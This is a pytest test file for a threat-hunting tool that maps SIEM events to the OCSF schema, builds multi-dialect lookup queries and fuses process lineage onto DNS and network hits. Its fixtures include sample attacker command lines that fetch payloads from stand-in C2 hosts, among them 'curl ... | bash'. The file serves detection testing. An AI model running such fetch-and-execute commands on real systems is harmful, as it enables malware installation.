"""Unit and integration tests for Unified Schema Entity Resolution (OCSF Alignment)
and Automatic Endpoint-to-Network Fusion.

Verifies:
- OCSF Class and Category classification across telemetry forms
- OCSF v1.1.0 schema serialization (to_ocsf_dict)
- Multi-dialect query synthesis for secondary lookups (network_connections and process_creation)
- Endpoint-to-network fusion engine recovering process lineage for C2 IP and domain hits
- Heuristic triage verdict elevation when fused process context is present
"""

from __future__ import annotations

import json
from datetime import UTC, datetime

import pytest

from hecate_runner.config import Settings
from hecate_runner.execution.fusion import (
    EndpointNetworkFusionEngine,
    build_network_connection_query,
    build_process_creation_query,
    parse_time_window,
)
from hecate_runner.execution.normalizer import (
    NormalizedEvent,
    OCSFCategoryUID,
    OCSFClassUID,
    classify_ocsf_event,
    normalize_event,
)
from hecate_runner.execution.safe_gate import SafeExecutionGate
from hecate_runner.execution.triage_agent import FindingTriageAgent
from hecate_runner.query_execution import (
    MockQueryProvider,
    ProposedQuery,
    QueryResult,
)


@pytest.fixture(autouse=True)
def _disable_live_llm_triage(monkeypatch: pytest.MonkeyPatch) -> None:
    """Heuristic triage tests must not wait on a live local/cloud model."""

    def _offline(*_a: object, **_k: object) -> None:
        raise RuntimeError("offline in unit tests")

    monkeypatch.setattr("hecate_agent.core.llm_router.create_router", _offline)


# --- 1. OCSF Classification & Normalization Tests ---------------------------


def test_classify_ocsf_dns_activity() -> None:
    raw_dns = {
        "_time": "2026-11-15T22:00:00Z",
        "host": "fin-srv-01",
        "query": "profitnow.io",
        "sourcetype": "stream:dns",
    }
    class_uid, class_name, cat_uid, cat_name = classify_ocsf_event(raw_dns)
    assert class_uid == int(OCSFClassUID.DNS_ACTIVITY)
    assert class_name == "DNS Activity"
    assert cat_uid == int(OCSFCategoryUID.NETWORK_ACTIVITY)
    assert cat_name == "Network Activity"

    event = normalize_event(raw_dns, target_siem="splunk", hunt_id="H-0038")
    assert event.class_uid == int(OCSFClassUID.DNS_ACTIVITY)
    assert event.domain == "profitnow.io"
    assert event.host == "fin-srv-01"


def test_classify_ocsf_network_activity() -> None:
    raw_net = {
        "_time": "2026-11-15T22:01:00Z",
        "host": "fin-srv-01",
        "src_ip": "10.0.4.55",
        "dest_ip": "198.51.100.44",
        "dest_port": "443",
        "sourcetype": "pan:traffic",
    }
    class_uid, class_name, cat_uid, _cat_name = classify_ocsf_event(raw_net)
    assert class_uid == int(OCSFClassUID.NETWORK_ACTIVITY)
    assert class_name == "Network Activity"
    assert cat_uid == int(OCSFCategoryUID.NETWORK_ACTIVITY)

    event = normalize_event(raw_net, target_siem="splunk", hunt_id="H-0038")
    assert event.class_uid == int(OCSFClassUID.NETWORK_ACTIVITY)
    assert event.src_ip == "10.0.4.55"
    assert event.dst_ip == "198.51.100.44"
    assert event.ip == "198.51.100.44"
    assert event.dst_port == 443


def test_classify_ocsf_process_activity() -> None:
    raw_proc = {
        "_time": "2026-11-15T22:02:00Z",
        "host": "fin-srv-01",
        "user": "root",
        "Image": "/usr/bin/curl",
        "ParentImage": "/bin/bash",
        "CommandLine": "curl -fsSL https://profitnow.io/update -o /tmp/.cache_sync",
        "ProcessId": "4820",
        "sourcetype": "linux:audit",
    }
    class_uid, class_name, cat_uid, _cat_name = classify_ocsf_event(raw_proc)
    assert class_uid == int(OCSFClassUID.PROCESS_ACTIVITY)
    assert class_name == "Process Activity"
    assert cat_uid == int(OCSFCategoryUID.SYSTEM_ACTIVITY)

    event = normalize_event(raw_proc, target_siem="splunk", hunt_id="H-0038")
    assert event.class_uid == int(OCSFClassUID.PROCESS_ACTIVITY)
    assert event.process_name == "/usr/bin/curl"
    assert event.parent_process == "/bin/bash"
    assert "curl -fsSL" in event.command_line
    assert event.pid == "4820"


def test_to_ocsf_dict_structure() -> None:
    event = NormalizedEvent(
        event_id="evt-12345",
        hunt_id="H-0038",
        target_siem="splunk",
        timestamp="2026-11-15T22:00:00Z",
        host="fin-srv-01",
        user="analyst1",
        process_name="/usr/bin/curl",
        parent_process="/bin/bash",
        command_line="curl -s http://c2.example/payload",
        ip="198.51.100.99",
        domain="c2.example",
        class_uid=int(OCSFClassUID.PROCESS_ACTIVITY),
        class_name="Process Activity",
        category_uid=int(OCSFCategoryUID.SYSTEM_ACTIVITY),
        category_name="System Activity",
        pid="991",
        parent_pid="990",
    )
    ocsf = event.to_ocsf_dict()

    assert ocsf["metadata"]["version"] == "1.1.0"
    assert ocsf["metadata"]["product"]["name"] == "Hecate"
    assert ocsf["class_uid"] == 1007
    assert ocsf["class_name"] == "Process Activity"
    assert ocsf["device"]["hostname"] == "fin-srv-01"
    assert ocsf["actor"]["user"]["name"] == "analyst1"
    assert ocsf["process"]["name"] == "/usr/bin/curl"
    assert ocsf["process"]["pid"] == 991
    assert ocsf["process"]["parent_process"]["name"] == "/bin/bash"
    assert ocsf["process"]["parent_process"]["pid"] == 990
    assert ocsf["dst_endpoint"]["ip"] == "198.51.100.99"
    assert ocsf["dst_endpoint"]["domain"] == "c2.example"
    assert ocsf["dns"]["query"]["hostname"] == "c2.example"


# --- 2. Multi-Dialect Query Generation Tests --------------------------------


def test_build_network_connection_query_dialects() -> None:
    # Splunk
    spl = build_network_connection_query(
        "splunk",
        host="srv-01",
        ip="198.51.100.44",
        domain_val="bad.test",
        earliest="2026-11-15T22:00:00Z",
        latest="2026-11-15T22:10:00Z",
    )
    assert 'host="srv-01"' in spl
    assert 'dest_ip="198.51.100.44"' in spl
    assert 'query="bad.test"' in spl
    assert "| head 5" in spl

    # Sentinel KQL
    kql = build_network_connection_query(
        "sentinel",
        host="srv-01",
        ip="198.51.100.44",
        domain_val="bad.test",
        earliest="2026-11-15T22:00:00Z",
        latest="2026-11-15T22:10:00Z",
    )
    assert "DeviceNetworkEvents" in kql
    assert 'DeviceName =~ "srv-01"' in kql
    assert 'RemoteIP == "198.51.100.44"' in kql
    assert 'RemoteUrl has "bad.test"' in kql
    assert "| take 5" in kql

    # Elastic
    eql = build_network_connection_query(
        "elastic",
        host="srv-01",
        ip="198.51.100.44",
        domain_val="bad.test",
    )
    assert 'host.name: "srv-01"' in eql
    assert 'destination.ip: "198.51.100.44"' in eql
    assert 'dns.question.name: "bad.test"' in eql

    # CrowdStrike
    cql = build_network_connection_query(
        "crowdstrike",
        host="srv-01",
        ip="198.51.100.44",
    )
    assert "#event_simpleName=NetworkConnectIP4" in cql
    assert 'ComputerName="srv-01"' in cql
    assert 'RemoteAddressIP4="198.51.100.44"' in cql


def test_build_process_creation_query_dialects() -> None:
    # Splunk
    spl = build_process_creation_query(
        "splunk",
        host="srv-01",
        proc_filter="curl",
        pid_filter="501",
        earliest="2026-11-15T22:00:00Z",
        latest="2026-11-15T22:10:00Z",
    )
    assert 'host="srv-01"' in spl
    assert 'process_name="*curl"' in spl
    assert "EventCode=1" in spl
    assert "| head 10" in spl

    # Sentinel KQL
    kql = build_process_creation_query(
        "sentinel",
        host="srv-01",
        proc_filter="curl",
    )
    assert "DeviceProcessEvents" in kql
    assert 'DeviceName =~ "srv-01"' in kql
    assert 'FileName =~ "curl"' in kql

    # SQL fallback
    sql = build_process_creation_query(
        "sql",
        host="srv-01",
        proc_filter="curl",
    )
    assert "SELECT * FROM process_creation" in sql
    assert "host = 'srv-01'" in sql
    assert "curl" in sql


def test_parse_time_window() -> None:
    ts = "2026-11-15T12:00:00Z"
    e_iso, l_iso, e_sp, l_sp = parse_time_window(ts, window_sec=120)
    assert e_iso == "2026-11-15T11:58:00+00:00"
    assert l_iso == "2026-11-15T12:02:00+00:00"
    assert e_sp == "11/15/2026:11:58:00"
    assert l_sp == "11/15/2026:12:02:00"


# --- 3. Endpoint-to-Network Fusion Engine Tests -----------------------------


def test_needs_lineage_fusion_logic() -> None:
    # Event lacking process context with external domain and host -> needs fusion
    dns_event = NormalizedEvent(
        event_id="e1",
        hunt_id="H-0038",
        target_siem="splunk",
        timestamp="2026-11-15T12:00:00Z",
        host="srv-01",
        domain="c2.attacker.com",
        class_uid=int(OCSFClassUID.DNS_ACTIVITY),
    )
    assert dns_event.needs_lineage_fusion() is True

    # Event already having complete process lineage -> does not need fusion
    complete_event = NormalizedEvent(
        event_id="e2",
        hunt_id="H-0038",
        target_siem="splunk",
        timestamp="2026-11-15T12:00:00Z",
        host="srv-01",
        domain="c2.attacker.com",
        process_name="curl",
        command_line="curl http://c2.attacker.com",
        class_uid=int(OCSFClassUID.PROCESS_ACTIVITY),
    )
    assert complete_event.needs_lineage_fusion() is False

    # Event lacking endpoint host -> cannot fuse
    no_host_event = NormalizedEvent(
        event_id="e3",
        hunt_id="H-0038",
        target_siem="splunk",
        timestamp="2026-11-15T12:00:00Z",
        domain="c2.attacker.com",
        class_uid=int(OCSFClassUID.DNS_ACTIVITY),
    )
    assert no_host_event.needs_lineage_fusion() is False


def test_fusion_engine_recovers_process_lineage() -> None:
    class MockFusionProvider(MockQueryProvider):
        def execute(self, query: ProposedQuery) -> QueryResult:
            q = query.query_text.lower()
            now_iso = datetime.now(UTC).isoformat()
            if " | count" in q or "stats count" in q:
                return QueryResult(
                    outcome="executed",
                    provider="splunk",
                    row_count=1,
                    detail=json.dumps([{"count": 1}]),
                )
            if "eventcode=3" in q or "network" in q:
                # Return socket connection showing curl and PID 3399
                return QueryResult(
                    outcome="executed",
                    provider="splunk",
                    row_count=1,
                    events=[
                        {
                            "_time": now_iso,
                            "host": "fin-srv-01",
                            "Image": "/usr/bin/curl",
                            "ProcessId": "3399",
                            "DestinationIp": "198.51.100.44",
                            "user": "root",
                        }
                    ],
                )
            if "eventcode=1" in q or "process" in q:
                # Return process creation with full command line and parent process
                return QueryResult(
                    outcome="executed",
                    provider="splunk",
                    row_count=1,
                    events=[
                        {
                            "_time": now_iso,
                            "host": "fin-srv-01",
                            "Image": "/usr/bin/curl",
                            "ParentImage": "/bin/bash",
                            "CommandLine": "curl -fsSL https://profitnow.io/update -o /tmp/.cache_sync",
                            "ProcessId": "3399",
                            "user": "root",
                        }
                    ],
                )
            return super().execute(query)

    provider = MockFusionProvider("splunk")
    gate = SafeExecutionGate(provider, max_auto_fetch=50)
    settings = Settings(auto_hunt_fusion_enabled=True, auto_hunt_fusion_window_sec=300)
    engine = EndpointNetworkFusionEngine(gate=gate, settings=settings)

    # Initial raw DNS event lacking process lineage
    raw_dns = {
        "_time": "2026-11-15T22:00:00Z",
        "host": "fin-srv-01",
        "query": "profitnow.io",
        "DestinationIp": "198.51.100.44",
        "sourcetype": "stream:dns",
    }
    events = [normalize_event(raw_dns, target_siem="splunk", hunt_id="H-0038")]

    assert events[0].process_name == ""
    assert events[0].parent_process == ""
    assert events[0].command_line == ""
    assert events[0].fused_lineage is False

    # Execute fusion
    fused_events = engine.fuse_events(events, target_siem="splunk", hunt_id="H-0038")

    # Verify process lineage was recovered and fused
    assert len(fused_events) == 1
    fused = fused_events[0]
    assert fused.fused_lineage is True
    assert fused.process_name == "/usr/bin/curl"
    assert fused.parent_process == "/bin/bash"
    assert "curl -fsSL" in fused.command_line
    assert fused.user == "root"
    assert fused.pid == "3399"
    assert fused.fusion_source == "endpoint_network_fusion"
    assert "_hecate_fusion" in fused.raw_data

    # Verify OCSF serialization preserves the fused lineage
    ocsf = fused.to_ocsf_dict()
    assert ocsf["process"]["name"] == "/usr/bin/curl"
    assert ocsf["process"]["parent_process"]["name"] == "/bin/bash"
    assert ocsf["enrichments"][0]["name"] == "endpoint_network_fusion"


# --- 4. Triage Elevation with Fused Telemetry --------------------------------


def test_triage_elevation_with_fused_lineage() -> None:
    # 1. Unfused DNS event triaged alone -> Inconclusive
    unfused_dns = NormalizedEvent(
        event_id="e1",
        hunt_id="H-0038",
        target_siem="splunk",
        timestamp="2026-11-15T22:00:00Z",
        host="fin-srv-01",
        domain="profitnow.io",
        ip="198.51.100.44",
        class_uid=int(OCSFClassUID.DNS_ACTIVITY),
    )
    agent = FindingTriageAgent(settings=Settings())
    unfused_report = agent.triage(
        hunt_id="H-0038",
        sweep_id="SWEEP-001",
        target_siem="splunk",
        events=[unfused_dns],
        hypothesis="Adversaries resolve C2 domains to download secondary payloads.",
    )
    assert unfused_report.verdict == "inconclusive"
    assert unfused_report.confidence == 0.0

    # 2. Same event with fused process context -> Suspicious / True Positive
    fused_dns = NormalizedEvent(
        event_id="e1",
        hunt_id="H-0038",
        target_siem="splunk",
        timestamp="2026-11-15T22:00:00Z",
        host="fin-srv-01",
        domain="profitnow.io",
        ip="198.51.100.44",
        class_uid=int(OCSFClassUID.DNS_ACTIVITY),
    )
    fused_dns.fuse_process_lineage(
        process_name="/usr/bin/curl",
        parent_process="/bin/bash",
        command_line="curl -fsSL https://profitnow.io/update | bash",
        user="root",
        pid="3399",
        fusion_source="endpoint_network_fusion",
    )

    fused_report = agent.triage(
        hunt_id="H-0038",
        sweep_id="SWEEP-001",
        target_siem="splunk",
        events=[fused_dns],
        hypothesis="Adversaries resolve C2 domains to download secondary payloads.",
    )
    # The presence of suspicious command pipe and curl LOLBin elevates to suspicious (0.75+)
    assert fused_report.is_threat is True
    assert fused_report.verdict in ("suspicious", "true_positive")
    assert fused_report.confidence >= 0.75
    assert (
        "T1059.004" in fused_report.technique_matches or "T1071" in fused_report.technique_matches
    )
    assert any("curl" in p for p in fused_report.extracted_entities["processes"])
    assert any("bash" in p for p in fused_report.extracted_entities["parent_processes"])
    assert "profitnow.io" in fused_report.extracted_entities["domains"]


def test_ecs_nested_source_destination_ip_extraction() -> None:
    raw = {
        "@timestamp": "2026-11-15T22:00:00Z",
        "host": {"name": "web-01"},
        "source": {"ip": "10.0.0.1", "port": 5555},
        "destination": {"ip": "198.51.100.10", "port": 443},
        "process": {"name": "curl", "command_line": "curl https://x"},
    }
    event = normalize_event(raw, target_siem="elastic", hunt_id="H-0001")
    assert event.host == "web-01"
    assert event.src_ip == "10.0.0.1"
    assert event.dst_ip == "198.51.100.10"
    assert event.src_port == 5555
    assert event.dst_port == 443
    assert event.process_name == "curl"


def test_case_insensitive_nested_ocsf_paths() -> None:
    raw = {
        "Device": {"Hostname": "CASEHOST"},
        "Actor": {"User": {"Name": "alice"}},
        "Process": {"Name": "whoami.exe", "Cmd_Line": "whoami"},
        "Dst_Endpoint": {"Ip": "9.9.9.9"},
    }
    event = normalize_event(raw, target_siem="splunk", hunt_id="H-0001")
    assert event.host == "CASEHOST"
    assert event.user == "alice"
    assert event.process_name == "whoami.exe"
    assert event.command_line == "whoami"
    assert event.dst_ip == "9.9.9.9"


def test_process_event_with_destination_hostname_not_dns() -> None:
    raw = {
        "host": "h1",
        "Image": r"C:\Windows\curl.exe",
        "CommandLine": "curl evil.com",
        "DestinationHostname": "evil.com",
        "EventCode": "1",
    }
    class_uid, class_name, _, _ = classify_ocsf_event(raw)
    assert class_uid == int(OCSFClassUID.PROCESS_ACTIVITY)
    assert class_name == "Process Activity"


def test_epoch_time_normalizes_for_ocsf_export() -> None:
    event = normalize_event(
        {"_time": "1700000000", "host": "h1", "dest_ip": "1.2.3.4"},
        target_siem="splunk",
        hunt_id="H-0001",
    )
    assert "2023" in event.timestamp or "2024" in event.timestamp
    ocsf = event.to_ocsf_dict()
    assert ocsf["time"] == 1700000000000


def test_crowdstrike_network_query_includes_domain() -> None:
    query = build_network_connection_query(
        "crowdstrike",
        host="HOST1",
        domain_val="evil.example",
    )
    assert "evil.example" in query
    assert "DomainName=" in query or "HostName=" in query


def test_list_and_wrapper_nested_field_extraction() -> None:
    event = normalize_event(
        {"process": {"name": ["curl", "unused"]}, "host": "h1", "EventCode": "1"},
        target_siem="elastic",
        hunt_id="H-0001",
    )
    assert event.process_name == "curl"

    wrapped = normalize_event(
        {"process": {"name": {"value": "nested-name"}}, "host": "h1", "EventCode": "1"},
        target_siem="splunk",
        hunt_id="H-0001",
    )
    assert wrapped.process_name == "nested-name"


def test_floatish_ports_and_pids_normalize() -> None:
    event = normalize_event(
        {
            "host": "h1",
            "dest_ip": "1.1.1.1",
            "dest_port": "443.0",
            "ProcessId": "42.0",
            "ParentProcessId": "7.0",
            "Image": "curl",
            "EventCode": "1",
        },
        target_siem="splunk",
        hunt_id="H-0001",
    )
    assert event.dst_port == 443
    assert event.pid == "42"
    assert event.parent_pid == "7"
    ocsf = event.to_ocsf_dict()
    assert ocsf["process"]["pid"] == 42
    assert ocsf["process"]["parent_process"]["pid"] == 7


def test_ecs_dns_question_name_classifies_dns() -> None:
    event = normalize_event(
        {"dns": {"question": {"name": "evil.com"}}, "host": {"name": "h1"}},
        target_siem="elastic",
        hunt_id="H-0001",
    )
    assert event.domain == "evil.com"
    assert event.class_uid == int(OCSFClassUID.DNS_ACTIVITY)


@pytest.mark.parametrize("dialect", ["elastic", "chronicle", "crowdstrike", "sql"])
def test_fusion_queries_include_time_window(dialect: str) -> None:
    earliest, latest = "2026-01-01T00:00:00Z", "2026-01-01T01:00:00Z"
    net = build_network_connection_query(
        dialect,
        host="host1",
        ip="1.1.1.1",
        earliest=earliest,
        latest=latest,
    )
    proc = build_process_creation_query(
        dialect,
        host="host1",
        earliest=earliest,
        latest=latest,
    )
    assert "2026" in net
    assert "2026" in proc


def test_negative_pid_and_bool_host_are_dropped() -> None:
    event = normalize_event(
        {"host": True, "ProcessId": "-3", "Image": "x.exe", "EventCode": "1"},
        target_siem="splunk",
        hunt_id="H-0001",
    )
    assert event.host == ""
    assert event.pid == ""
    assert event.to_ocsf_dict()["process"]["pid"] is None


def test_hash_prefix_stripped() -> None:
    event = normalize_event(
        {
            "host": "h1",
            "Hashes": "MD5=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            "Image": "x.exe",
            "EventCode": "1",
        },
        target_siem="splunk",
        hunt_id="H-0001",
    )
    assert event.hash_val == "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"


def test_partial_fuse_does_not_request_refusion() -> None:
    event = NormalizedEvent(
        event_id="e1",
        hunt_id="H-0001",
        target_siem="splunk",
        timestamp="2026-01-01T00:00:00Z",
        host="fin-1",
        dst_ip="198.51.100.1",
        class_uid=int(OCSFClassUID.NETWORK_ACTIVITY),
    )
    assert event.needs_lineage_fusion() is True
    event.fuse_process_lineage(process_name="curl")
    assert event.fused_lineage is True
    assert event.needs_lineage_fusion() is False


def test_parent_only_fuse_does_not_lock_lineage() -> None:
    event = NormalizedEvent(
        event_id="e1",
        hunt_id="H-0001",
        target_siem="splunk",
        timestamp="2026-01-01T00:00:00Z",
        host="fin-1",
        dst_ip="198.51.100.1",
        class_uid=int(OCSFClassUID.NETWORK_ACTIVITY),
    )
    event.fuse_process_lineage(process_name="", parent_process="explorer.exe")
    assert event.parent_process == "explorer.exe"
    assert event.fused_lineage is False
    assert event.needs_lineage_fusion() is True


def test_ocsf_hash_length_maps_to_algorithm_keys() -> None:
    md5_event = normalize_event(
        {"host": "h1", "md5": "a" * 32, "Image": "x.exe", "EventCode": "1"},
        target_siem="splunk",
        hunt_id="H-0001",
    )
    assert md5_event.to_ocsf_dict()["file"]["hashes"] == {"md5": "a" * 32}

    sha1_event = normalize_event(
        {"host": "h1", "SHA1": "b" * 40, "Image": "x.exe", "EventCode": "1"},
        target_siem="splunk",
        hunt_id="H-0001",
    )
    assert sha1_event.to_ocsf_dict()["file"]["hashes"] == {"sha1": "b" * 40}


def test_ipv6_host_populates_device_ip() -> None:
    event = normalize_event(
        {"host": "2001:db8::2", "dest_ip": "2001:db8::1", "EventCode": "3"},
        target_siem="splunk",
        hunt_id="H-0001",
    )
    ocsf = event.to_ocsf_dict()
    assert ocsf["device"]["ip"] == "2001:db8::2"
    assert ocsf["src_endpoint"]["ip"] == "2001:db8::2"

    bracketed = normalize_event(
        {"host": "[2001:db8::3]", "dest_ip": "1.1.1.1", "EventCode": "3"},
        target_siem="splunk",
        hunt_id="H-0001",
    )
    assert bracketed.to_ocsf_dict()["device"]["ip"] == "2001:db8::3"


def test_file_hash_md5_nested_extraction() -> None:
    event = normalize_event(
        {
            "file": {"hash": {"md5": "a" * 32}},
            "host": "h1",
            "EventCode": "11",
            "TargetFilename": "/tmp/x",
        },
        target_siem="elastic",
        hunt_id="H-0001",
    )
    assert event.hash_val == "a" * 32


def test_sentinel_fusion_datetime_has_no_trailing_z() -> None:
    query = build_network_connection_query(
        "sentinel",
        host="HOST1",
        ip="1.1.1.1",
        earliest="2026-01-01T00:00:00Z",
        latest="2026-01-01T01:00:00Z",
    )
    assert "datetime(" in query
    assert 'datetime("2026-01-01T00:00:00Z")' not in query
    assert "+00:00" in query


def test_fusion_recovers_via_process_lookup_when_network_empty() -> None:
    class ProcessOnlyProvider(MockQueryProvider):
        def execute(self, query: ProposedQuery) -> QueryResult:
            q = query.query_text.lower()
            now_iso = datetime.now(UTC).isoformat()
            is_count = " | count" in q or "stats count" in q
            if "eventcode=3" in q or "devicenetwork" in q:
                if is_count:
                    return QueryResult(
                        outcome="executed",
                        provider="splunk",
                        row_count=1,
                        detail=json.dumps([{"count": 0}]),
                    )
                return QueryResult(outcome="executed", provider="splunk", row_count=0, events=[])
            if is_count:
                return QueryResult(
                    outcome="executed",
                    provider="splunk",
                    row_count=1,
                    detail=json.dumps([{"count": 1}]),
                )
            return QueryResult(
                outcome="executed",
                provider="splunk",
                row_count=1,
                events=[
                    {
                        "_time": now_iso,
                        "host": "fin-1",
                        "Image": "/usr/bin/wget",
                        "CommandLine": "wget http://c2",
                        "User": "bob",
                        "ProcessId": "12",
                        "ParentImage": "/bin/sh",
                        "EventCode": "1",
                    }
                ],
            )

    engine = EndpointNetworkFusionEngine(
        gate=SafeExecutionGate(provider=ProcessOnlyProvider()),
        settings=Settings(),
    )
    event = NormalizedEvent(
        event_id="e1",
        hunt_id="H-0001",
        target_siem="splunk",
        timestamp="2026-01-01T00:00:00Z",
        host="fin-1",
        dst_ip="198.51.100.1",
        class_uid=int(OCSFClassUID.NETWORK_ACTIVITY),
    )
    fused = engine.fuse_events([event], target_siem="splunk", hunt_id="H-0001")[0]
    assert fused.fused_lineage is True
    assert "wget" in fused.process_name
    assert "wget http://c2" in fused.command_line
